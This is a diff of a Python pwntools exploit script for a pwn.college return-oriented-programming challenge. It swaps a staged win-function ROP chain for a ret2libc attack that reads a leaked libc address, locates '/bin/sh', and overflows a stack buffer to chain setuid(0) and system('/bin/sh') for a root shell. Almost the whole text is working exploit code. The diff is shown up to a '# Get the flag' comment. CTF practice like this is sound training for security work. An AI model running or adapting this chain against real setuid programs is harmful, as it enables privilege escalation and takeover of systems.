@@ -1,59 +1,71 @@
 #!/usr/bin/env python3
 # pwn.college/program-security/return-oriented-programming/
-# Challenge: chain-of-command-hard
+# Challenge: leveraging-libc-hard
 
 from pwn import *
 
-# Target information
-# All win_stage functions found via objdump
-win_stage_1 = 0x4015E3
-win_stage_2 = 0x40133A
-win_stage_3 = 0x4016BF
-win_stage_4 = 0x40141A
-win_stage_5 = 0x401500
-
-# ROP gadget: pop rdi ; ret
-pop_rdi = 0x401903
-
-# Offset calculation:
-# Buffer at -0x50(%rbp)
-# Saved RBP is 8 bytes
-# Return address is after saved RBP
-offset = 0x50 + 0x8
-
-# Build ROP chain
-# Each stage needs: pop_rdi (to set arg1) + stage_number + win_stage_N address
-payload = b"A" * offset
-
-# Stage 1: win_stage_1(1)
-payload += p64(pop_rdi)
-payload += p64(1)
-payload += p64(win_stage_1)
-
-# Stage 2: win_stage_2(2)
-payload += p64(pop_rdi)
-payload += p64(2)
-payload += p64(win_stage_2)
-
-# Stage 3: win_stage_3(3)
-payload += p64(pop_rdi)
-payload += p64(3)
-payload += p64(win_stage_3)
-
-# Stage 4: win_stage_4(4)
-payload += p64(pop_rdi)
-payload += p64(4)
-payload += p64(win_stage_4)
-
-# Stage 5: win_stage_5(5)
-payload += p64(pop_rdi)
-payload += p64(5)
-payload += p64(win_stage_5)
+# Set context
+context.arch = "amd64"
 
 # Start the challenge process
-io = process("/challenge/chain-of-command-hard")
+io = process("/challenge/leveraging-libc-hard")
+
+# Receive the leaked system address
+io.recvuntil(b'The address of "system" in libc is: ')
+leak = io.recvline().strip().decode()
+# Remove the trailing period if present
+leak = leak.rstrip(".")
+system_addr = int(leak, 16)
+log.info(f"Leaked system address: {hex(system_addr)}")
+
+# Calculate libc base address
+# We need to find the offset of system in libc
+# For typical libc, we can calculate the offset to "/bin/sh" string
+# Common offsets (may need adjustment based on libc version):
+# system offset in libc is usually around 0x50d60 or similar
+# /bin/sh offset in libc is usually around 0x1d8698 or similar
+
+# We'll use a common technique: calculate libc base from system
+# Then find /bin/sh string in libc
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc.address = system_addr - libc.symbols["system"]
+log.info(f"Libc base address: {hex(libc.address)}")
+
+# Find /bin/sh string in libc
+binsh_addr = next(libc.search(b"/bin/sh"))
+log.info(f"/bin/sh address: {hex(binsh_addr)}")
+
+# Get setuid address from libc
+setuid_addr = libc.symbols["setuid"]
+log.info(f"setuid address: {hex(setuid_addr)}")
+
+# ROP gadgets from the binary
+pop_rdi = 0x4013F3  # pop rdi; ret
+ret = 0x40101A  # ret (for stack alignment)
+
+# Calculate buffer overflow offset
+# From the disassembly: buffer is at -0x90(%rbp)
+# Stack layout: buffer (0x90 bytes) + saved rbp (8 bytes) + return address (8 bytes)
+offset = 0x90 + 8
+
+# Build the payload
+payload = b"A" * offset
+
+# ROP chain to call setuid(0) then system("/bin/sh")
+# First call setuid(0) to maintain root privileges
+payload += p64(pop_rdi)  # pop rdi; ret
+payload += p64(0)  # uid = 0 (root)
+payload += p64(ret)  # Stack alignment for setuid
+payload += p64(setuid_addr)  # setuid(0)
+
+# Then call system("/bin/sh")
+payload += p64(pop_rdi)  # pop rdi; ret
+payload += p64(binsh_addr)  # "/bin/sh" address
+payload += p64(ret)  # Stack alignment for system
+payload += p64(system_addr)  # system("/bin/sh")
 
 # Send the payload
+log.info(f"Sending payload of length {len(payload)}")
 io.send(payload)
 
 # Get the flag
